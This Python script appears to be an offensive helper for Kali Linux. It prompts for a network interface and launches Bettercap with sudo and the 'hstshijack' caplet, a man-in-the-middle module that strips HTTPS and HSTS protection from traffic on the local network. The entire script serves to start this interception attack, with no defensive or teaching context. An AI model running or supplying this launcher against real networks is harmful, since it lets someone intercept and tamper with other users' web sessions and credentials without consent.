#!/usr/bin/env python3
import subprocess
import argparse

def start_bettercap():
	try:
		interface = None
		yes_choice = {'yes', 'y'}
		no_choice = {'no', 'n'}

		print("\n [+] Starting Bettercap...")
		print("[+] eth0 is the default first wired interface in Kali Linux")
		user_input = input("[+] Is this an acceptable interface to use? y/n  ").lower().strip()
		if user_input in yes_choice:
			interface = "eth0"
		if user_input in no_choice:
			interface = input("[+] Please provide an interface to use: ").lower().strip()
		print("[+] Interface selected is: ", interface)
		print("[+] Request, set bettercap iface to: " + interface)
		subprocess.call(["sudo", "bettercap", "-iface", interface, "-caplet", "hstshijack/hstshijack"])

	except Exception as e:
		print("[-] Something went wrong while starting Bettercap: ", e)